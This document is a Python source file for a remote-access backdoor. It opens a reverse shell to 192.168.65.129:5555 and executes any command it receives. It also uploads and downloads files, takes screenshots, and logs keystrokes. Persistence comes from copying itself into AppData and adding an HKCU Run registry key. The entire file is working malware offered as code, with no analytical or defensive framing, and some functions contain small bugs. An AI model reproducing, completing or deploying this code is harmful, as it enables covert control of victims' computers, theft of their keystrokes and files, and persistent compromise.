import keylogger ,socket ,json , subprocess,os,pyautogui ,threading,sys,shutil

def reliableSend(data):
    jsonData = json.dumps(data)
    s.send(jsonData.encode())


def reliableRecv():
    data = ''
    while True:
        try:
            data+=s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def DownloadFile(fileName):
    f = open(fileName,'wb') #opening the file to read by bytes
    s.settimeout(1)#we need it for the except statement
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def uploadFile(Fname):
    f = open(Fname,'rb')
    s.send(f.read())

def screenShot():
    myScreenSHot = pyautogui.screenshot()
    myScreenSHot.save('screen.png')
    os.remove()

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] +'\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v'+reg_name + '/t REG_SZ /d "'+file_location+'"',shell=True)
            reliableSend('[+] created persistence with reg key :'+reg_name)
        else:
            reliableSend('[+] Persistence already exists')
    except:
        reliableSend('[+] Error creating persistence with the target machine')
def shell():
    while True:
        command = reliableRecv()

        if command == 'quit':break
        elif command == 'clear' : pass
        elif command == 'help':pass
        elif command[:3] == 'cd ' :os.chdir(command[3:])
        elif command[:6] == 'upload' :DownloadFile(command[7:])
        elif command[:8] == 'download' : uploadFile(command[8:])
        elif command[:11] == 'persistence':
            reg_name ,copy_name = command[12:].split(' ')
            persist(reg_name,copy_name)
        elif command[:10] == 'screenshot' :
            screenShot()
            uploadFile('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start())
            t.start()
            reliableSend('[+] Keylogger Started')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliableSend(logs)
        elif command[:11] == 'keylog_stop':
            keylog.selfDestruct()
            t.join()
            reliableSend('[+] keylogger stopped')
            
        
        else:
            execute = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE
                                    ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliableSend(result)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.65.129',5555))

shell()